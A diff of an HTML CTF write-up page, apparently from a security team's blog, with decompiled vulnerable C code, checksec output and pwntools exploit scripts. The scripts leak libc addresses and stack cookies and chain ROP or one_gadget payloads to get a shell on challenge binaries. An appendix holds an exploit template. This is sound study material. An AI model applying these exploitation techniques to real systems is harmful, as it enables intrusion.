   printstr(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">This did not work as planned..</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
 }
 </code></pre></div><p>We do have a way to increment pies one by one using <code>stare</code>, but then the program will stop when reaching 16 pies:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">check_pie</span>(<span style="color:#66d9ef">int</span> pie)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">check_pie</span>(<span style="color:#66d9ef">int</span> pie)
 {
   [...]
 
@@ -660,11 +660,11 @@ printstr(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n<
 </code></pre></div><p>Once this requirement will be satisfied, everything will be ready to make an effective stack overflow, as we have libc addresses and the stack cookie.</p>
 <h4 id="stealing-pies">Stealing pies</h4>
 <p>The last function to use is <code>inventory</code>, which we can use to leave items from our stuff. However, we can specify a negative integer, which will cause the inventory to be incremented, and not decremented as planned.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">printstr(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">How many do you want to drop?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&gt; &#34;</span>);
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">printstr(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">How many do you want to drop?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&gt; &#34;</span>);
 __isoc99_scanf(<span style="color:#e6db74">&#34;%d&#34;</span>, <span style="color:#f92672">&amp;</span>v1);
 pie <span style="color:#f92672">-=</span> v1;
 </code></pre></div><p>The exploit code:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
 
     p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>)
     p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;y&#39;</span>)
@@ -676,7 +676,7 @@ pie <span style="color:#f92672">-=</span> v1;
 </code></pre></div><p>On the next call to <code>stare</code>, the count of pies will reach 22, which will trigger the stack overflow.</p>
 <h3 id="exploitation-2">Exploitation</h3>
 <p>The last step is to find a one_gadget that works with our constraints, and build the stack payload to overwrite the legitimate stack and gain a shell:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;3&#39;</span>)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;3&#39;</span>)
     p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>)
 
     ropchain <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
@@ -691,7 +691,7 @@ pie <span style="color:#f92672">-=</span> v1;
 
     p<span style="color:#f92672">.</span>interactive()
 </code></pre></div><p>Put it all together:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> flat, cyclic
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> flat, cyclic
 
 <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exploit</span>(p, elf, libc):
 
@@ -721,8 +721,8 @@ pie <span style="color:#f92672">-=</span> v1;
 
     cookie <span style="color:#f92672">=</span> int(m<span style="color:#f92672">.</span>group(<span style="color:#ae81ff">1</span>), <span style="color:#ae81ff">0</span>)
 
-    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Libc base: </span><span style="color:#e6db74">%x</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> libc_base)
-    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Cookie: </span><span style="color:#e6db74">%x</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> cookie)
+    print(<span style="color:#e6db74">&#34;Libc base: </span><span style="color:#e6db74">%x</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> libc_base)
+    print(<span style="color:#e6db74">&#34;Cookie: </span><span style="color:#e6db74">%x</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> cookie)
     
     <span style="color:#75715e"># 2. Stealing pies with inventory function</span>
     p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
@@ -758,19 +758,19 @@ pie <span style="color:#f92672">-=</span> v1;
 <ul>
 <li>A leak to <code>printf</code> inside the function <code>recycle-&gt;form</code> after 5 reclycle command</li>
 </ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">color(<span style="color:#e6db74">&#34;You have already recycled at least 5 times! Please accept this gift: &#34;</span>, <span style="color:#e6db74">&#34;magenta&#34;</span>);
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">color(<span style="color:#e6db74">&#34;You have already recycled at least 5 times! Please accept this gift: &#34;</span>, <span style="color:#e6db74">&#34;magenta&#34;</span>);
 printf(<span style="color:#e6db74">&#34;[%p]</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#f92672">&amp;</span>printf);
 </code></pre></div><ul>
 <li>An arbitrary read inside the function <code>recycle-&gt;form</code> after 10 reclycle command</li>
 </ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">color(<span style="color:#e6db74">&#34;You have recycled 10 times! Feel free to ask me whatever you want.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&gt; &#34;</span>, <span style="color:#e6db74">&#34;cyan&#34;</span>);
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">color(<span style="color:#e6db74">&#34;You have recycled 10 times! Feel free to ask me whatever you want.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&gt; &#34;</span>, <span style="color:#e6db74">&#34;cyan&#34;</span>);
 read(<span style="color:#ae81ff">0</span>, nptr, <span style="color:#ae81ff">0x10uLL</span>);
 s <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)strtoull(nptr, <span style="color:#ae81ff">0LL</span>, <span style="color:#ae81ff">0</span>);
 puts(s);
 </code></pre></div><ul>
 <li>An arbitrary write inside the function <code>plant</code>, as already used in <a href="#minefield---difficulty-14">minefield</a></li>
 </ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">printf(<span style="color:#e6db74">&#34;&gt; &#34;</span>);
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">printf(<span style="color:#e6db74">&#34;&gt; &#34;</span>);
 read(<span style="color:#ae81ff">0</span>, buff, <span style="color:#ae81ff">0x10uLL</span>);
 target_addr <span style="color:#f92672">=</span> (_QWORD <span style="color:#f92672">*</span>)strtoull(buff, <span style="color:#ae81ff">0LL</span>, <span style="color:#ae81ff">0</span>);
 putchar(<span style="color:#ae81ff">10</span>);
@@ -790,7 +790,7 @@ puts(<span style="color:#e6db74">&#34;Thanks a lot for your contribution!&#34;</
 <h3 id="attack-method-4">Attack method</h3>
 <p>The difficult part here is to get control of RIP.</p>
 <p>Protections are as follow:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;environment&#39;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;environment&#39;</span>
     Arch:     amd64-64-little
     RELRO:    Full RELRO
     Stack:    Canary found
@@ -802,7 +802,7 @@ puts(<span style="color:#e6db74">&#34;Thanks a lot for your contribution!&#34;</
 <p>Perfect ! We have all the elements to exploit this binary.</p>
 <h3 id="exploitation-3">Exploitation</h3>
 <p>The final exploitation is:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exploit</span>(p, elf, libc):
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exploit</span>(p, elf, libc):
 
     printf_offset  <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;printf&#39;</span>]
     environ_offset <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;environ&#34;</span>]
@@ -822,17 +822,17 @@ puts(<span style="color:#e6db74">&#34;Thanks a lot for your contribution!&#34;</
     result <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>search(pattern, str(data))
 
     <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> result:
-        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;FAIL&#34;</span>)
+        print(<span style="color:#e6db74">&#34;FAIL&#34;</span>)
         exit(<span style="color:#ae81ff">1</span>)
 
     leak_printf <span style="color:#f92672">=</span> int(result[<span style="color:#ae81ff">1</span>], <span style="color:#ae81ff">16</span>)
 
-    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Leak printf: </span><span style="color:#e6db74">%x</span><span style="color:#e6db74"> - Printf offset: </span><span style="color:#e6db74">%x</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> (leak_printf, printf_offset))
+    print(<span style="color:#e6db74">&#34;Leak printf: </span><span style="color:#e6db74">%x</span><span style="color:#e6db74"> - Printf offset: </span><span style="color:#e6db74">%x</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> (leak_printf, printf_offset))
 
     libc_base <span style="color:#f92672">=</span> leak_printf <span style="color:#f92672">-</span> printf_offset
 
-    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Libc base: </span><span style="color:#e6db74">%x</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> libc_base)
-    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Environ read addr </span><span style="color:#e6db74">%x</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> (environ_offset <span style="color:#f92672">+</span> libc_base))
+    print(<span style="color:#e6db74">&#34;Libc base: </span><span style="color:#e6db74">%x</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> libc_base)
+    print(<span style="color:#e6db74">&#34;Environ read addr </span><span style="color:#e6db74">%x</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> (environ_offset <span style="color:#f92672">+</span> libc_base))
 
     <span style="color:#75715e"># Trigger environ leak by recycling</span>
     <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">10</span>):
@@ -846,7 +846,7 @@ puts(<span style="color:#e6db74">&#34;Thanks a lot for your contribution!&#34;</
     toSend <span style="color:#f92672">=</span> hex(environ_offset <span style="color:#f92672">+</span> libc_base)
     p<span style="color:#f92672">.</span>sendline(toSend)
     environ_leak <span style="color:#f92672">=</span> u64(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt; &#34;</span>)<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#ae81ff">0</span>][<span style="color:#f92672">-</span><span style="color:#ae81ff">6</span>:] <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x00</span><span style="color:#e6db74">&#34;</span>)
-    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Environ value: </span><span style="color:#e6db74">%x</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> environ_leak)
+    print(<span style="color:#e6db74">&#34;Environ value: </span><span style="color:#e6db74">%x</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> environ_leak)
 
     fct_hidden_resources <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4010B5</span>
 
@@ -869,7 +869,7 @@ puts(<span style="color:#e6db74">&#34;Thanks a lot for your contribution!&#34;</
 <p>The libc used by the binary is provided with this challenge.</p>
 <h3 id="attack-method-5">Attack method</h3>
 <p>Protections are as follow:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;close_the_door&#39;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;close_the_door&#39;</span>
     Arch:     amd64-64-little
     RELRO:    Full RELRO
     Stack:    No canary found
@@ -877,7 +877,7 @@ puts(<span style="color:#e6db74">&#34;Thanks a lot for your contribution!&#34;</
     PIE:      No PIE <span style="color:#f92672">(</span>0x400000<span style="color:#f92672">)</span>
 </code></pre></div><p>No PIE and No canary found, looks like a stack overflow !</p>
 <p><code>hidden_function</code> holds the vulnerable part, with a clean stack overflow:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">__int64</span> buf[<span style="color:#ae81ff">4</span>]; <span style="color:#75715e">// [rsp+10h] [rbp-40h] BYREF
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">__int64</span> buf[<span style="color:#ae81ff">4</span>]; <span style="color:#75715e">// [rsp+10h] [rbp-40h] BYREF
 </span><span style="color:#75715e"></span><span style="color:#66d9ef">int</span> v3; <span style="color:#75715e">// [rsp+30h] [rbp-20h]
 </span><span style="color:#75715e"></span><span style="color:#66d9ef">int</span> v4; <span style="color:#75715e">// [rsp+34h] [rbp-1Ch]
 </span><span style="color:#75715e"></span><span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>v5; <span style="color:#75715e">// [rsp+38h] [rbp-18h]
@@ -894,7 +894,7 @@ write(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;Do 
 read(<span style="color:#ae81ff">0</span>, buf, <span style="color:#ae81ff">0x464uLL</span>);  <span style="color:#75715e">// Stack overflow !
 </span><span style="color:#75715e"></span>write(<span style="color:#ae81ff">1</span>, v5, v4);
 </code></pre></div><p>However, when overwriting the stack, one has to be cautious not to screw arguments used to perform the write just after:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">strace .<span style="color:#f92672">/</span>close_the_door
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">strace .<span style="color:#f92672">/</span>close_the_door
 
 read(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">42</span>
 <span style="color:#e6db74">&#34;4&#34;</span>, <span style="color:#ae81ff">1</span>)                         <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
@@ -911,7 +911,7 @@ write(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;SA<
 <h3 id="exploit">Exploit</h3>
 <p>We will turn it into our advantage: we can give to the <code>write</code> function crafted arguments to leak us a libc address. Subsequent <code>read</code> allows us to inject the computed address of the one-gadget to get a shell.</p>
 <p>Our selection for leaking libc address is the GOT entry of alarm:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> flat, p32
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> flat, p32
 <span style="color:#f92672">from</span> struct <span style="color:#f92672">import</span> unpack
 
 <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exploit</span>(p, elf, libc):
@@ -970,7 +970,7 @@ write(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;SA<
 <h2 id="appendix">Appendix</h2>
 <h3 id="template-script-for-exploitation-based-on-pwntoolshttpsgithubcomgallopsledpwntools">Template script for exploitation based on <a href="https://github.com/Gallopsled/pwntools">pwntools</a></h3>
 <p>Here is the script we used. If we ever improve it, we may publish it on our <a href="https://github.com/thalium/thalium_ctf">CTF repository on github</a>.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> gdb, context, log, ELF, remote, process, p64, u64
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> gdb, context, log, ELF, remote, process, p64, u64
 <span style="color:#f92672">from</span> os <span style="color:#f92672">import</span> listdir, path
 <span style="color:#f92672">import</span> sys
 
@@ -1003,21 +1003,21 @@ PATH_LIBS <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;
 
 
 <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">usage</span>():
-    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Usage in default mode: ./path_to_bin/bin&#34;</span>)
-    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Usage in debug mode: -d ./path_to_bin/bin&#34;</span>)
-    <span style="color:#66d9ef">print</span>(
+    print(<span style="color:#e6db74">&#34;Usage in default mode: ./path_to_bin/bin&#34;</span>)
+    print(<span style="color:#e6db74">&#34;Usage in debug mode: -d ./path_to_bin/bin&#34;</span>)
+    print(
         <span style="color:#e6db74">&#34;Usage with custom libc: -libc VERSION</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Libc must be in </span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">You can check https://github.com/niklasb/libc-database to find libc binaries.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">You can check https://github.com/skysider/pwndocker to find how to run with other custom libraries&#34;</span>
         <span style="color:#f92672">%</span> PATH_LIBS
     )
 
-    <span style="color:#66d9ef">print</span>(
+    print(
         <span style="color:#e6db74">&#34;Usage in remote mode: -r host port ./path_to_bin/bin (*./path_to_libc/libc &lt;- optional)&#34;</span>
     )
     exit()
 
 
 <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_PIE</span>(proc):
-    memory_map <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;/proc/{}/maps&#34;</span><span style="color:#f92672">.</span>format(proc<span style="color:#f92672">.</span>pid), <span style="color:#e6db74">&#34;rb&#34;</span>)<span style="color:#f92672">.</span>readlines()
+    memory_map <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;/proc/</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">/maps&#34;</span><span style="color:#f92672">.</span>format(proc<span style="color:#f92672">.</span>pid), <span style="color:#e6db74">&#34;rb&#34;</span>)<span style="color:#f92672">.</span>readlines()
     <span style="color:#66d9ef">for</span> line <span style="color:#f92672">in</span> memory_map:
         <span style="color:#66d9ef">if</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>][<span style="color:#ae81ff">2</span>:]<span style="color:#f92672">.</span>encode() <span style="color:#f92672">in</span> line<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;-&#34;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]:
             <span style="color:#66d9ef">return</span> int(line<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;-&#34;</span>)[<span style="color:#ae81ff">0</span>], <span style="color:#ae81ff">16</span>)
@@ -1044,7 +1044,7 @@ PATH_LIBS <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;
         <span style="color:#e6db74">&#34;set verbose on</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>  <span style="color:#75715e"># set debug-file-directory /home/user/libs/glibc-2.27/debug</span>
     )
     script <span style="color:#f92672">+=</span> add_bps(r, bps, elf)
-    <span style="color:#66d9ef">print</span>(script)
+    print(script)
     gdb<span style="color:#f92672">.</span>attach(r, gdbscript<span style="color:#f92672">=</span>script)
 
 
@@ -1063,11 +1063,11 @@ PATH_LIBS <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;
     <span style="color:#66d9ef">except</span>:
         myExit(<span style="color:#e6db74">&#34;Problem with binary path &#34;</span> <span style="color:#f92672">+</span> binary)
 
-    ldPath <span style="color:#f92672">=</span> None
-    libc <span style="color:#f92672">=</span> None
-    libcPath <span style="color:#f92672">=</span> None
-    DEBUG <span style="color:#f92672">=</span> False
-    REMOTE <span style="color:#f92672">=</span> False
+    ldPath <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
+    libc <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
+    libcPath <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
+    DEBUG <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
+    REMOTE <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
 
     env <span style="color:#f92672">=</span> {}
     i <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>
@@ -1075,7 +1075,7 @@ PATH_LIBS <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;
         opt <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[i]
         <span style="color:#66d9ef">if</span> opt <span style="color:#f92672">==</span> Mode<span style="color:#f92672">.</span>DEBUG:
             log<span style="color:#f92672">.</span>debug(<span style="color:#e6db74">&#34;Enable gdb mode&#34;</span>)
-            DEBUG <span style="color:#f92672">=</span> True
+            DEBUG <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
             i <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
         <span style="color:#66d9ef">elif</span> opt <span style="color:#f92672">==</span> Mode<span style="color:#f92672">.</span>REMOTE:
             <span style="color:#66d9ef">try</span>:
@@ -1084,7 +1084,7 @@ PATH_LIBS <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;
             <span style="color:#66d9ef">except</span>:
                 myExit(<span style="color:#e6db74">&#34;Problem with -r HOST PORT&#34;</span>)
             log<span style="color:#f92672">.</span>debug(<span style="color:#e6db74">&#34;Enable remote connection to &#34;</span>, host, port)
-            REMOTE <span style="color:#f92672">=</span> True
+            REMOTE <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
             i <span style="color:#f92672">+=</span> <span style="color:#ae81ff">3</span>
 
         <span style="color:#66d9ef">elif</span> opt <span style="color:#f92672">==</span> Mode<span style="color:#f92672">.</span>LIBC:
@@ -1119,7 +1119,7 @@ PATH_LIBS <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;
         r <span style="color:#f92672">=</span> remote(host, int(port))
 
     <span style="color:#66d9ef">else</span>:
-        <span style="color:#66d9ef">if</span> ldPath <span style="color:#f92672">is</span> None:
+        <span style="color:#66d9ef">if</span> ldPath <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span>:
             r <span style="color:#f92672">=</span> process(binary, env<span style="color:#f92672">=</span>env)
         <span style="color:#66d9ef">else</span>:
             r <span style="color:#f92672">=</span> process([ldPath, binary], env<span style="color:#f92672">=</span>env)
